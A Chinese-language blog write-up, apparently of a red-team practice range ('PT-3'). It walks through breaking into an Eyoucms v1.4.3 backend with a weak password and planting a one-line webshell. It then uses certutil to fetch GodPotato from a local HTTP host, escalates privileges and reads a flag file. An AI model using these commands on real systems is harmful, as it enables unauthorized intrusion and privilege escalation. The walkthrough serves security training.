+++
title = "PT-3"
date = 2026-06-15T23:22:42+08:00
draft = false
description = "红队蓝军靶场PT系列"
tags = ["内网", "域渗透", "提权"]
categories = ["内网", "域渗透", "提权"]
series = ["内网", "域渗透", "提权"]
pin = false
+++
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416162555227.png)

目录扫描有后台    弱口令    cyberstrikelab    123456

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416162815044.png)

然后直接搜  rce

Eyoucms v1.4.3 版本后台修改模板文件可代码执行

插入一句话木马 

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416183400098.png)

蚁剑连接

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416183512844.png)

发现有一个flag 文件  但是刷新发现文件不完整  

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416183703557.png)

结果命令一看然后发现有问题 

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203110302.png)


然后立即进行想到  烂土豆提权


本地起一个HTTP服务

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203224852.png)


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203239725.png)

然后下载即可

certutil -urlcache -split -f http://172.16.233.2/GodPotato-NET4.exe C:\ps\WWW\uploads\gp.exe

```c
gp.exe -cmd "whoami"
```

然后提权 成功了

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203333725.png)

搜索C盘的flag文件

```c
gp.exe -cmd "cmd /c dir C:\*flag* /s /b"
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203529219.png)

```c
gp.exe -cmd "cmd /c type C:\ps\flag.txt"
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416203608396.png)


go-flag{a4645a82-9cc1-4c1b-a834-bbae67bac22c}























